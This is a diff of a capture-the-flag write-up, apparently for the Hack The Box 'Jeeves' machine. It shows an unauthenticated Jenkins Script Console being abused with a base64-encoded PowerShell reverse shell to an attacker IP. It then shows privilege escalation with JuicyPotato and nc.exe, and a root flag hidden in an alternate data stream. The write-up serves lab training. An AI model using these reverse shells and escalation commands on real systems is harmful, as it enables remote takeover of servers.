@@ -66,6 +66,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 51.50 seconds
 ```
 ## P1
+Firstly, we do some basic enumeration on port 80:
 ```
 └─$ ffuf -u http://10.129.62.218:50000/FUZZ -w /mnt/hgfs/D/bb/pentest-tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt 
 
@@ -90,29 +91,39 @@ ________________________________________________
 ________________________________________________
 
 askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
-
 ```
+What's interesting ! We find out a path **/askjeeves** and it allows us to access to jenkins admin dashboard without requiring authentication :D
+
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-30.png){: w="700" }
 
 ## P2
+Whenever coming up with this situation, I always go directly to "Script console" where we can abuse groovy to create some reverse shell.<br>
 
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31.png){: w="700" }
-```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.107', 9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
-```
 
-![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-28.png){: w="700" }
-
-```
-powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
-```
-```
-def cmd = "powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA".execute();
-```
+First of all, prepare a powershell reverse shell with my listener on kali linux **10.10.15.107:9001**:
 ```
 └─$ nc -nlvp 9001
 ```
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.107', 9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+To avoid this reverse shell being filtered for unusual characters, I usually encode it to **UTF-16LE** and then **Base64**
+
+![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-28.png){: w="700" }
+
+Good, now we have a new payload like this:
+```
+powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+```
+Okey, now we create a completed reverse shell in groovy:
+```
+def cmd = "powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA".execute();
+```
+
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31_1.png){: w="700" }
+
+Put it in **Script Console** and click **Run**. And our listener receive connection from reverse shell. Very nice !!
 
 ```
 └─$ nc -nlvp 9001
@@ -121,11 +132,12 @@ connect to [10.10.15.107] from (UNKNOWN) [10.129.62.218] 49681
 
 PS C:\Users\Administrator\.jenkins>
 ```
-
+Read **c:\users\kohsuke\Desktop\user.txt** to get the first flag !
 ```
 PS C:\users\kohsuke\Desktop> type user.txt
 ```
 ## P3 & P4
+Now it's time for us to privilege escalate. Luckily, the current user has **SeImpersonatePrivilege** privilege. Time for playing with **Potatoes** :D
 ```
 PS C:\Users\Administrator\.jenkins> whoami /priv
 
@@ -142,13 +154,16 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
+On my kali linux, I create a **smb server** just for a way to copy file from my attack host to the target.
 ```
 └─$ sudo impacket-smbserver share -smb2support /mnt/hgfs/D/bb/pentest-tools/windows-tools/windows-privesc
 ```
+I have tried with many type of **Potato** but just **JuicyPotato** works well. So for easily writing blog :), I will only copy **JuicyPotato.exe** and **nc.exe** to the target.
 ```
 PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\JuicyPotato.exe
 PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\nc.exe
 ```
+Next, search for CLSID:
 ```
 PS C:\Users\Administrator\.jenkins> reg query HKCR\CLSID /s /f "LocalService"
 
@@ -160,9 +175,11 @@ HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
 
 End of search: 2 match(es) found.
 ```
+Okey, we have all indeed data, now start the listener on my attacker host:
 ```
 nc -lvnp 3001
 ```
+Use **JuicyPotato.exe** to create a reverse shell to my listner:
 ```
 PS C:\Users\Administrator\.jenkins> .\JuicyPotato.exe -t * -p cmd.exe -l 53375 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -a "/c c:\users\administrator\.jenkins\nc.exe 10.10.15.107 3001 -e cmd.exe"
 Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 53375
@@ -181,12 +198,13 @@ Microsoft Windows [Version 10.0.10586]
 
 C:\Windows\system32>
 ```
+After have **SYSTEM** shell, I go directly to Administrator Desktop folder and face with this :)
 ```
 C:\Windows\system32>type c:\users\Administrator\Desktop\hm.txt
 type c:\users\Administrator\Desktop\hm.txt
 The flag is elsewhere.  Look deeper.
 ```
-
+Because the file name which contains the root flag usually is **root.txt** or **flag.txt** so I try to find it manually like these:
 ```
 C:\Windows\system32>dir /s /b C:\*flag* 2>nul               
 dir /s /b C:\*flag* 2>nul
@@ -298,6 +316,11 @@ C:\Windows\WinSxS\Manifests\msil_microsoft.windows.d..updatediagrootcause_31bf38
 C:\Windows\WinSxS\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.resources.dll
 C:\Windows\WinSxS\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.dll
 ```
+Sadly, no files are true !!!!.<br>
+Just when it seemed all hope was lost, I suddenly remembered a time in the past when I was pentesting an upload feature and reading payloads on PayloadAllTheThings. I recalled a payload related to something called Alternate Data Stream (ADS) on Windows. Why don't I try it on this lab?
+
+![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-56.png){: w="700" }
+
 ```
 C:\Users\Administrator\Desktop>dir /R
 dir /R
@@ -314,7 +337,7 @@ dir /R
                2 File(s)            833 bytes
                2 Dir(s)   2,635,968,512 bytes free
 ```
-
+So good, thanks my memory !!
 ```
 C:\Users\Administrator\Desktop>more < hm.txt:root.txt
 ```
